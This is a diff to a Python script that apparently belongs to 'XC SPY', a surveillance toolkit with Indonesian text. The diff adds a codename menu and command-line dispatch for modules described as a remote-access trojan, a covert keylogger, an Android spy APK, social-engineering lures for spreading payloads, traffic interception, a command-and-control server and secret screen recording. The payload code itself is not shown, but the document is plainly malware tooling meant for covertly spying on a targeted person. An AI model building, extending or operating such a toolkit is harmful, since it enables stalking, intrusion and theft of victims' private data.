@@ -735,33 +735,155 @@ def full_mode(lhost=None, lport=4444):
 #  MAIN
 # ═══════════════════════════════════════════════════════
 
+# ═══════════════════════════════════════════════════════
+#  INTERACTIVE MENU — CODENAME SYSTEM
+# ═══════════════════════════════════════════════════════
+
+CODENAMES = {
+    # Modul utama
+    "PHANTOM":   ("rat",       "Modul 1 — Kuasai PC target dari jarak jauh"),
+    "SHADOW":    ("keylogger", "Modul 2 — Rekam semua ketikan diam-diam"),
+    "SPECTRE":   ("android",   "Modul 3 — Masuk HP target lewat APK"),
+    "MIRAGE":    ("lure",      "Modul 4 — Jebakan sosial buat nyebar payload"),
+    "VENOM":     ("network",   "Modul 5 — Intercept semua traffic jaringan"),
+    "NEXUS":     ("c2",        "Modul 6 — Pusat komando & kendali agent"),
+    "ECLIPSE":   ("screen",    "Modul 7 — Rekam layar target diam-diam"),
+    # Special
+    "BLACKOUT":  ("full",      "FULL ARSENAL — Gas semua modul sekaligus"),
+    # Alias shortcut
+    "P":         ("rat",       None),
+    "SH":        ("keylogger", None),
+    "SP":        ("android",   None),
+    "M":         ("lure",      None),
+    "V":         ("network",   None),
+    "N":         ("c2",        None),
+    "E":         ("screen",    None),
+    "B":         ("full",      None),
+}
+
+def menu_banner():
+    print(f"""{M}{BOLD}
+ ██╗  ██╗ ██████╗    ███████╗██████╗ ██╗   ██╗
+ ╚██╗██╔╝██╔════╝    ██╔════╝██╔══██╗╚██╗ ██╔╝
+  ╚███╔╝ ██║         ███████╗██████╔╝ ╚████╔╝
+  ██╔██╗ ██║         ╚════██║██╔═══╝   ╚██╔╝
+ ██╔╝ ██╗╚██████╗    ███████║██║        ██║
+ ╚═╝  ╚═╝ ╚═════╝    ╚══════╝╚═╝        ╚═╝
+{D}       Person & Device Surveillance System{RST}
+{D}       XC Hacking Hub — Spy Division{RST}
+""")
+
+def show_menu(lhost):
+    menu_banner()
+    print(f"  {D}IP Aktif: {W}{lhost}{RST}\n")
+    print(f"  {M}{BOLD}{'─'*44}{RST}")
+    print(f"  {Y}{BOLD}  CODENAME     SHORTCUT   DESKRIPSI{RST}")
+    print(f"  {M}{BOLD}{'─'*44}{RST}")
+
+    modules = [
+        ("PHANTOM",  "P",   "Modul 1", "Kuasai PC target dari jauh"),
+        ("SHADOW",   "SH",  "Modul 2", "Rekam semua ketikan"),
+        ("SPECTRE",  "SP",  "Modul 3", "Masuk HP via APK"),
+        ("MIRAGE",   "M",   "Modul 4", "Jebakan sosial / lure"),
+        ("VENOM",    "V",   "Modul 5", "Intercept traffic jaringan"),
+        ("NEXUS",    "N",   "Modul 6", "Pusat komando agent"),
+        ("ECLIPSE",  "E",   "Modul 7", "Rekam layar diam-diam"),
+    ]
+
+    for name, short, num, desc in modules:
+        print(f"  {C}{name:<12}{RST}  [{W}{short}{RST}]   {D}{num} — {desc}{RST}")
+
+    print(f"  {M}{BOLD}{'─'*44}{RST}")
+    print(f"  {R}{BOLD}BLACKOUT{RST}      [{W}B{RST}]   {R}FULL ARSENAL — Gas semua!{RST}")
+    print(f"  {M}{BOLD}{'─'*44}{RST}")
+    print(f"  {D}exit / quit / q  → keluar{RST}\n")
+
+def interactive_menu(lhost, lport, target, iface):
+    modes_map = {
+        "rat":       lambda: module_rat(lhost, lport),
+        "keylogger": lambda: module_keylogger(),
+        "android":   lambda: module_android(lhost, lport),
+        "lure":      lambda: module_lure(target, lhost, lport),
+        "network":   lambda: module_network(iface),
+        "c2":        lambda: module_c2(lhost, lport),
+        "screen":    lambda: module_screen(),
+        "full":      lambda: full_mode(lhost, lport),
+    }
+
+    show_menu(lhost)
+
+    while True:
+        try:
+            cmd = input(f"\n  {M}XC-SPY{RST} {D}»{RST} ").strip().upper()
+        except (KeyboardInterrupt, EOFError):
+            print(f"\n\n  {D}Session ended. DAR DER DOR.{RST}\n")
+            break
+
+        if not cmd:
+            continue
+
+        if cmd in ("EXIT", "QUIT", "Q"):
+            print(f"\n  {D}Session ended. DAR DER DOR.{RST}\n")
+            break
+
+        if cmd == "HELP" or cmd == "?":
+            show_menu(lhost)
+            continue
+
+        if cmd == "CLEAR" or cmd == "CLS":
+            os.system("clear" if os.name != "nt" else "cls")
+            show_menu(lhost)
+            continue
+
+        if cmd in CODENAMES:
+            mode_key, desc = CODENAMES[cmd]
+            if desc:
+                print(f"\n  {M}[EXECUTING]{RST} {Y}{cmd}{RST} — {D}{desc}{RST}")
+                time.sleep(0.3)
+            modes_map[mode_key]()
+        else:
+            # Coba partial match
+            matches = [k for k in CODENAMES if k.startswith(cmd) and CODENAMES[k][1]]
+            if len(matches) == 1:
+                mode_key, desc = CODENAMES[matches[0]]
+                print(f"\n  {M}[EXECUTING]{RST} {Y}{matches[0]}{RST} — {D}{desc}{RST}")
+                time.sleep(0.3)
+                modes_map[mode_key]()
+            elif len(matches) > 1:
+                print(f"\n  {Y}[?]{RST} Ambiguous: {', '.join(matches)}")
+            else:
+                print(f"\n  {R}[!]{RST} Unknown codename: {cmd}")
+                print(f"  {D}Ketik HELP atau ? buat lihat menu{RST}")
+
 def main():
-    banner()
     parser = argparse.ArgumentParser(
         description="XC SPY — Person/Device Surveillance Toolkit",
         formatter_class=argparse.RawTextHelpFormatter
     )
-    parser.add_argument("mode", nargs="?", default="full",
-        choices=["rat","keylogger","android","lure","network","c2","screen","full"],
+    parser.add_argument("mode", nargs="?", default=None,
         help=(
-            "rat        → Windows RAT payload + post-exploit\n"
-            "keylogger  → Python keylogger generator\n"
-            "android    → Android APK spy + post-exploit\n"
-            "lure       → Social engineering lures\n"
-            "network    → MITM + traffic intercept\n"
-            "c2         → C2 server setup\n"
-            "screen     → Screen capture spy\n"
-            "full       → Semua modul sekaligus [default]"
+            "Codename mode (opsional — kalau kosong masuk interactive menu)\n\n"
+            "PHANTOM  / P   → Modul 1: PC Takeover\n"
+            "SHADOW   / SH  → Modul 2: Keylogger\n"
+            "SPECTRE  / SP  → Modul 3: Android Spy\n"
+            "MIRAGE   / M   → Modul 4: Social Lure\n"
+            "VENOM    / V   → Modul 5: Network MITM\n"
+            "NEXUS    / N   → Modul 6: C2 Server\n"
+            "ECLIPSE  / E   → Modul 7: Screen Spy\n"
+            "BLACKOUT / B   → FULL ARSENAL\n"
         ))
-    parser.add_argument("--lhost", help="Your IP (auto-detect if not set)")
+    parser.add_argument("--lhost", help="Your IP (auto-detect jika kosong)")
     parser.add_argument("--lport", type=int, default=4444, help="Listen port (default: 4444)")
-    parser.add_argument("--target", default="target", help="Target name for lure files")
+    parser.add_argument("--target", default="target", help="Target name untuk lure files")
     parser.add_argument("--iface", default="wlan0", help="Network interface (default: wlan0)")
 
     args = parser.parse_args()
     lhost = args.lhost or get_local_ip()
 
-    modes = {
+    # Map codename → mode
+    mode_lookup = {k: v[0] for k, v in CODENAMES.items()}
+
+    modes_map = {
         "rat":       lambda: module_rat(lhost, args.lport),
         "keylogger": lambda: module_keylogger(),
         "android":   lambda: module_android(lhost, args.lport),
@@ -772,7 +894,19 @@ def main():
         "full":      lambda: full_mode(lhost, args.lport),
     }
 
-    modes[args.mode]()
+    if args.mode is None:
+        # Interactive menu mode
+        interactive_menu(lhost, args.lport, args.target, args.iface)
+    else:
+        banner()
+        key = args.mode.upper()
+        if key in mode_lookup:
+            modes_map[mode_lookup[key]]()
+        elif args.mode in modes_map:
+            modes_map[args.mode]()
+        else:
+            print(f"{R}[!] Unknown mode: {args.mode}{RST}")
+            print(f"{D}Ketik: python3 spy.py --help{RST}")
 
 if __name__ == "__main__":
     main()
